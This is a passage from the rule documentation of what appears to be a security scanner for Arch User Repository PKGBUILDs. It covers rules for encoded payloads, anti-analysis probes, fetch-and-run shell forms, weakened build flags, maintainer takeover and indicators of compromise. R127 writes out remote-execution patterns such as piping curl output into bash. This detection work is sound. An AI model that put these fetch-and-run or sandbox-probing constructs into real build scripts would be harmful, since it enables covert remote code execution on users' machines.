**R118-blob**, an ELF blob encoded inside the PKGBUILD, is R120 with a magic
check, so an encoded ELF fires R120.

Does not fire on: a `-bin`/`-appimage`/`-wine` package whose binary arrives via
a declared `source=`, or on icons, fonts, `.desktop` files and test fixtures.

### R119: Anti-Analysis Check {#r119}

- **Severity:** HIGH (weight 25)
- **Category:** `anti_analysis`
- **Condition:** A build or install function probes for a debugger (`TracerPid`), a VM (`systemd-detect-virt`, DMI or hypervisor strings), a sandbox, or CI (`$CI`, `$GITHUB_ACTIONS`, `$CONTAINER`, `/.dockerenv`), from `[patterns] anti_analysis_probes`.

A build script checking whether it is being watched has no legitimate purpose.
Architecture and feature detection (`uname -m`, `getconf`) is not a probe and
does not fire.

Fire rate: 0 of 3246.

### R120: Reconstructed Executable Payload {#r120}

- **Severity:** HIGH (weight 25)
- **Category:** `execution`
- **Condition:** Text on an added line (base64, hex, uuencode, or an R117 reconstruction) decodes to bytes carrying ELF, shebang, PE or Mach-O magic.

This is a type check on the decoder's output, which is why one rule covers
every encoded-payload variant without naming the encoding. Encoded text assets,
checksums and keys decode to none of those magics.

Fire rate: 0 of 3246.

### R121: Build-time Generation Then Execution {#r121}

- **Severity:** HIGH (weight 25)
- **Category:** `execution`
- **Condition:** A heredoc, `printf` or `cat >` writes a script or source file that the same function then compiles or executes.

Writing a config file, a `.desktop` entry or a patch that a declared build step
consumes is not generation-then-execution and does not fire.

Fire rate: 0 of 3246.

### R122: Archive Trailer Anomaly {#r122}

- **Severity:** HIGH (weight 25)
- **Category:** `integrity`
- **Condition:** An archive carries data past its declared trailer (gzip, tar or zip).

R122 is a pure function over bytes (`check_archive_trailer`). It is tested but
**not wired into any shipped analysis path**, so it fires on nothing today: no
code hands it bytes.

That is deliberate rather than unfinished. Fetching what a PKGBUILD points at
would add an SSRF primitive, tell the attacker who scanned them, and break the
one-host boundary the [security model](../security.md#the-invariants)
enforces. The only bytes TrustSight is willing to feed it are the AUR's own
snapshot tarball, corpus-side, where downloads are centralised and distributed
as facts. Until that path exists, R122 is a function with a test suite and no
call site, and this page says so rather than implying coverage that is absent.

### R124: Write Then Execute {#r124}

- **Severity:** HIGH (weight 25)
- **Category:** `execution`
- **Condition:** A path the recipe writes is then executed by the same function.

The execution side counts interpreters, `source`, `.`, compilers and a plain
absolute path at a command position, with or without arguments. Files that
arrived through a declared `source=` and the project's own configure/make
artefacts are exempt.

Fire rate: 0 of 3246.

### R127: Indirect Remote Execution {#r127}

- **Severity:** CRITICAL (weight 40)
- **Category:** `execution`
- **Condition:** A fetched script reaches a shell by a path the pipe-to-shell rules do not see: process substitution (`bash <(curl ...)`), `xargs` (`curl ... | xargs bash`), or a here-string fed by command substitution (`bash <<< "$(curl ...)"`).

Each still executes remote code at build time, so it belongs with R001/R002
rather than at R010/R011's "uses curl" LOW.

---

## Composition (R086, R089) {#composition-rules}

Both are annotations. Neither adds weight, so neither can turn a clean package
into a flagged one on its own.

### R086: Host Reconnaissance {#r086}

- **Severity:** INFO (weight 0)
- **Category:** `recon`
- **Condition:** Host-profiling commands from `[patterns] recon_commands` run at a command position inside a build or install function.

A lone `uname -m` is an architecture check and is reported at INFO by design.
`env`, `dmidecode` and `systemd-detect-virt` are deliberately absent: the first
produced a false positive on a `sed` expression, and the other two are R119's.

Fire rate: 0 of 3246.

### R089: Attack-Chain Composition {#r089}

- **Severity:** INFO (weight 0)
- **Category:** `composition`
- **Condition:** The findings on one package span at least `[thresholds] r089.attack_chain_stages` (default 3) distinct kill-chain stages.

Stages: takeover (R071, R090, R126), mass adoption (R092, R125), install hook
(R068, R062), foreign fetch (R001, R081, R118, R080), payload (R120, R121),
obfuscation (R082, R117), anti-analysis (R119), write-then-execute (R124),
staging (R084), recon (R086), persistence (R085, R114, R128), exfil (R087,
R123), hidden drop (R088).

Each stage counts once however many rules in it fired, and R089's own finding
is excluded from its own count. It is a composition annotation, not an additive
score: the point is that several independent stages co-occurred, which is what
separated the 2018 acroread attack and the 2026 Atomic Arch campaign from
single-signal noise.

Fire rate: 0 of 3246. A benign diff with one or two rule hits cannot reach
three distinct stages.

---

## Integrity and trust (R130, R131) {#integrity-trust-rules}

### R130: Signing Key Set Changed {#r130}

- **Severity:** HIGH (weight 25) on replacement, MEDIUM (weight 15) on addition, INFO (weight 0) on introduction
- **Category:** `integrity`
- **Condition:** `validpgpkeys` gains a fingerprint.

Whoever holds a key in `validpgpkeys` can ship code to every user of the
package, so the set changing is a trust change that the diff states outright.
R069 owns the removal case, verification being taken away. R130 owns the other
two: a key **replaced** (one fingerprint out, a different one in) means the same
sources are now trusted under a different holder, and a key **added** to an
existing set widens who may sign. Introducing `validpgpkeys` where there was
none is signature checking being switched on, so it is reported as a neutral
fact rather than as a finding against the package.

Fire rate: 6 of 3246 (0.18 %), two introductions and four upstream key
rotations.

### R131: Build Flags Weakened {#r131}

- **Severity:** HIGH (weight 25) when a mitigation is switched off, MEDIUM (weight 15) on a top-level replacement
- **Category:** `integrity`
- **Condition:** A recipe line assigns `CFLAGS`, `CXXFLAGS`, `CPPFLAGS`, `LDFLAGS`, `RUSTFLAGS` or `MAKEFLAGS` either to a value naming a disabling flag (`-fno-stack-protector`, `-D_FORTIFY_SOURCE=0`, `-U_FORTIFY_SOURCE`, `-no-pie`, `-Wl,-z,norelro`, ...) or, at the top level, to a literal set that does not reference the variable it replaces.

makepkg exports a hardened flag set. A recipe that appends to it keeps those
mitigations; one that assigns over it drops every mitigation the distribution
configured, and one that spells out a disabling flag drops a named one. Either
way the installed binary is built with weaker mitigations than the same source
built through the normal path, and no package metadata says so.

R070 already reports that a build function modified the environment, which is
the weaker claim, so R131 does not restate it: the MEDIUM branch is top-level
only, where R070 is blind and where the assignment also runs at parse time. A
value carrying no literal flag (`CFLAGS="${_cflags[@]}"`) is a set this rule
cannot read, so it says nothing about it. Only the recipe's own lines count; a
vendored Makefile inside a shipped patch is not the packager's assignment.

Fire rate: 3 of 3246 (0.09 %), all one wine package that genuinely disables
FORTIFY_SOURCE.

---

## Class B: declaration-scope rules (R115, R116) {#class-b-rules}

### R115: Epoch Introduced {#r115}

- **Severity:** MEDIUM (weight 15), INFO for a bare `epoch=0`
- **Category:** `version`
- **Condition:** A diff introduces `epoch=` where the previous revision had none.

An epoch overrides normal version comparison, so introducing one forces an
upgrade regardless of what the version numbers say. A pre-existing epoch never
surfaces in a hunk, so bumping one is quiet.

Fire rate: 0 of 3246.

### R116: Provides/Replaces Scope Expansion {#r116}

- **Severity:** HIGH (weight 25) for an established package, MEDIUM (weight 15) for a widely-provided one
- **Category:** `dependency`
- **Condition:** A newly claimed `provides` or `replaces` names an established package (official repo or fallback observations) or a widely-provided one (observation count at or above `[r116] widely_provided_observations`, default 25).

Claiming another project's name redirects installs of that name to this
package. Relatedness suppresses the obvious false positive: variant, companion
and sibling stems of the package's own name never fire. Cold start cannot fire
either branch, since neither corpus nor pacman data exists to establish what is
established. R116 always runs; the experimental D004 covers the same ground and
may double-report when experimental rules are enabled.

Fire rate: 0 of 3246.

---

## Class C: longitudinal rules (R083, R094 to R098, R102) {#class-c-rules}

Class C rules do not read a diff. They read `PropertyBreak` records from the
corpus property layer: a value that held for many consecutive observations and
then changed. Every one of them is silent on a cold database by construction,
because the first observation of a property only inserts it.

The `[longitudinal] stability_floor` (default 10) is the gate: a value must hold
at least that many consecutive observations before a change is reported at all.
Above the floor the weight ramps logistically, reaching roughly 0.9 by about 40
observations.

### R083: Long-Stable Property Changed {#r083}

- **Severity:** MEDIUM (weight 15)
- **Category:** `temporal`
- **Condition:** A tracked property with no more specific rule (`license`, `install_hook_present`) changed after a long stable run.

### R094: Security-Relevant Build Flag Change {#r094}

- **Severity:** HIGH (weight 25) when a flag was dropped, MEDIUM (weight 15) when one appeared
- **Category:** `build`
- **Condition:** A long-stable `configure_flags` set changed, and the change touches `[patterns] security_relevant_flags`.

Dropping a hardening flag is the weightier direction, because it removes a
mitigation the package had.

### R095: Dependency Vendored Into Source {#r095}

- **Severity:** HIGH (weight 25) for a security-relevant library, MEDIUM (weight 15) otherwise
- **Category:** `dependency`
- **Condition:** A dependency was removed and a new source entry appeared whose project name matches the removed dependency name.

Narrowed to that mechanical case on purpose. Vendoring a library bypasses the
distribution's security updates for it, and `[patterns] security_relevant_libraries`
is what raises the severity.

### R096: Source Host Changed {#r096}

- **Severity:** MEDIUM (weight 15)
- **Category:** `source`
- **Condition:** A long-stable `source_hosts` or `source_orgs` set changed.

### R097: Version Scheme Changed {#r097}

- **Severity:** INFO (weight 0)
- **Category:** `context`
- **Condition:** The package's version scheme changed (semver to date, and so on). Context only, by design.

### R098: Package Description Changed {#r098}

- **Severity:** MEDIUM (weight 15)
- **Category:** `integrity`
- **Condition:** A long-stable `pkgdesc` token set changed.

### R102: Build System Changed {#r102}

- **Severity:** MEDIUM (weight 15)
- **Category:** `build`
- **Condition:** Long-stable `build_system_markers` or `build_line_count` changed.

---

## Class D: corpus rules (R071, R090, R092, R093, R100, R101, R105, R107, R108, R110, R111, R112, R125, R126) {#class-d-rules}

Class D rules describe the corpus, not a package. They run once per metadata
cycle in `trustsight full-aur`, after the per-package loop, and each returns one
finding per **cluster**, with the members in `params.members`. They are silent
without a prior snapshot: the calibration gate is
`fire_rate(no_baseline) == 0`.

### R071: Untrusted Maintainer Takeover (corpus path) {#r071-corpus}

- **Severity:** HIGH (weight 25)
- **Category:** `maintainer`
- **Condition:** An ownership transition whose incoming maintainer maintained no package at all in the previous snapshot.

The per-package R071 asks the observation database whether an account has been
seen. On the corpus path the snapshot is the better witness: it names the
maintainer of every package in the AUR. R071 ships alongside R090 on the same
transition, as two findings on two pieces of evidence, so a handover between
established packagers carries R090 alone.

### R090: Ownership Transition {#r090}

- **Severity:** MEDIUM (weight 15)
- **Category:** `maintainer`
- **Condition:** A package that existed in the previous snapshot changed to a different, non-empty maintainer.

A move to an empty maintainer is abandonment, which R093 and R111 handle as
orphan state rather than as a takeover.

### R092: Mass Adoption {#r092}

- **Severity:** HIGH (weight 25)
- **Category:** `adoption`
- **Condition:** One maintainer submitted at least `[thresholds] r092.min_packages` (default 10) packages within `r092.window_days` (default 7).

### R093: Orphan/Adoption Dependency {#r093}

- **Severity:** MEDIUM (weight 15)
- **Category:** `dependency`
- **Condition:** A package depends directly on a package orphaned or adopted in this cycle.

### R100: Shared Source Repository {#r100}

- **Severity:** HIGH (weight 25)
- **Category:** `adoption`
- **Condition:** At least `[thresholds] r100.min_packages` (default 3) otherwise unrelated packages share a source repository, a new domain, or an adoption window.

### R101: Name/Host Consensus Divergence {#r101}

- **Severity:** MEDIUM (weight 15)
- **Category:** `source`
- **Condition:** An ecosystem-prefixed package (`python-`, `ruby-`, `nodejs-`, ...) is sourced from neither its ecosystem's canonical hosts nor a known forge.

### R105: Attribute Burst {#r105}

- **Severity:** MEDIUM (weight 15)
- **Category:** `adoption`
- **Condition:** At least `[thresholds] r105.min_packages` (default 5) packages sharing a maintainer were modified within `r105.window_hours` (default 24).

Only modified packages count. R092 already claims the added-package clusters,
so counting additions here would report the same maintainer twice.

### R107: Transitive Exposure {#r107}

- **Severity:** INFO (weight 0)
- **Category:** `dependency`
- **Condition:** A package's transitive closure, at least `[thresholds] r107.min_hops` (default 2) hops away, reaches a package adopted out of the orphan state this cycle. Context only, never additive.

### R108: Maintainer Baseline Deviation {#r108}

- **Severity:** MEDIUM (weight 15)
- **Category:** `maintainer`
- **Condition:** A maintainer's activity this cycle deviates from their own recorded baseline by at least `[thresholds] r108.z_score` (default 2.0), once `r108.min_history_cycles` (default 3) cycles of their history exist.

### R110: Name/Repo Divergence {#r110}

- **Severity:** MEDIUM (weight 15)
- **Category:** `source`
- **Condition:** The package name and the repository it is built from share no meaningful token.

### R111: Transitive Orphan Exposure {#r111}

- **Severity:** INFO (weight 0)
- **Category:** `dependency`
- **Condition:** A package's transitive closure includes a currently orphaned package. Context only, never additive.

### R112: Dependency Centrality {#r112}

- **Severity:** INFO (weight 0)
- **Category:** `dependency`
- **Condition:** A package is depended on by at least `[thresholds] r112.min_dependents` (default 50) AUR packages. Prioritisation only: it says what a compromise would reach, not that anything is wrong.

### R125: Introduction Rate Deviation {#r125}

- **Severity:** MEDIUM (weight 15)
- **Category:** `adoption`
- **Condition:** The corpus-wide introduction rate for a cycle deviates from the baseline mean by at least `[thresholds] r125.z_score` (default 3.0), once at least `r125.min_history_cycles` (default 3) cycles of history exist. An immature history is quiet.

### R126: Adopt-then-Modify {#r126}

- **Severity:** MEDIUM (weight 15)
- **Category:** `maintainer`
- **Condition:** A package adopted this cycle also changed version in the same cycle, within `[thresholds] r126.window_days` (default 14).

R126 is the exception to the novelty ceiling described in
[what TrustSight cannot see](../explanation/what-trustsight-cannot-see.md): it
fires on the **first** package of a campaign, from the maintainer field and
commit times alone, before any payload shape exists to recognise. Adoption
without a version change is quiet, and so is a change outside the window.

---

## Class E: indicators of compromise (R106) {#class-e-rules}

### R106: Known Indicator of Compromise {#r106}

- **Severity:** tiered by the indicator's confidence: `confirmed` is FATAL, `high` is CRITICAL, `medium` is HIGH, an untiered entry is MEDIUM
- **Category:** `ioc`
- **Condition:** A declared surface exactly matches an entry in `iocs.toml`.

Four surfaces are read: the package's own name; names added to
`depends`/`makedepends`/`optdepends`/`checkdepends`/`provides`/`replaces`; the
host of any URL and any bare host token; and any hex digest of digest length.
R106 also reads the current PKGBUILD, not only the diff, so a dependency on a
package later published as malware is reported on every review rather than only
on the one that introduced it.

Matching is **exact**. Normalisation is limited to what is not part of the
identity: case, a trailing root dot, IDNA spelling, surrounding quotes. A host
is never stripped of a subdomain and a name is never stemmed, because that would
turn equality into resemblance. A malformed entry is dropped with a warning
rather than coerced.

**The shipped list is empty.** TrustSight does not invent indicators, so a fresh
install cannot fire R106 at all, and a miss is uninformative. `trustsight corpus
pivot <indicator>` inverts the rule: given one indicator, it lists every corpus
package referencing it, reading only stored material and never the network.

A `confirmed` indicator cannot be suppressed through `overrides.json`.

---

## Not currently a rule {#not-rules}

- **R073 (release cadence)** is metadata on the analysis record, not a scored
  finding. See [R073](#r073).
- **R103 and R109** describe the ruleset's ceiling rather than a detection.
  See [the novelty ceiling](../explanation/what-trustsight-cannot-see.md).

---

## Benchmark performance

Measured against the TrustSight test corpus.

!!! warning "Two rows predate a ruleset expansion"

    The recall rows above were measured while `observation_count` was never populated, so Tier C novelty contributed zero to every score (see [Cold Start and Maturity](../explanation/cold-start-and-maturity.md)), and before the R039+ expanded rules or C004-C007 shipped. The three distribution rows below are re-measured by the calibration gates against the current 3,246-diff corpus on every push.

| Rule | Recall | Notes |
|------|--------|-------|
| CRITICAL class (all) | 100 % | Every CRITICAL-class sample detected. |
| R012 (prompt injection) | 17 % | Tripwire; catches obvious patterns only. Low recall is intentional. |
| R013 (unicode bidi) | 88 % | Misses some bidi variants. |
| Benign zero-rate | 74.9 % | Percentage of benign diffs scoring 0. |
| Benign p95 | 30 | 95th percentile score on benign corpus. |
| CRITICAL p5 | 60 | 5th percentile score on CRITICAL-class corpus. |
